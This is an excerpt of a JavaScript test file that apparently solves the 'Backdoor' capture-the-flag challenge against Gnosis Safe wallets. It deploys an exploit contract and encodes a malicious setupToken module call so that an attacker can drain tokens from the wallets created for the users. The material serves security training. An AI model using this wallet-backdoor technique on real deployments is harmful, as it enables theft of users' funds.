...
describe("[Challenge] Backdoor", function () {
  ...
  it("Exploit", async function () {
    // Reference best explained: https://blog.openzeppelin.com/backdooring-gnosis-safe-multisig-wallets/
    const exploitBackdoor = (
      await (
        await ethers.getContractFactory("ExploitBackdoor", deployer)
      ).deploy(
        attacker.address,
        this.walletFactory.address,
        this.masterCopy.address,
    ...
    const moduleABI = [
      "function setupToken(address _tokenAddress, address _attackerAddress)",
    ];
    const moduleIFace = new ethers.utils.Interface(moduleABI);
    const setupData = moduleIFace.encodeFunctionData("setupToken", [
      this.token.address,
      exploitBackdoor.address,
    ]);

    await exploitBackdoor.attack(users, setupData);
  });
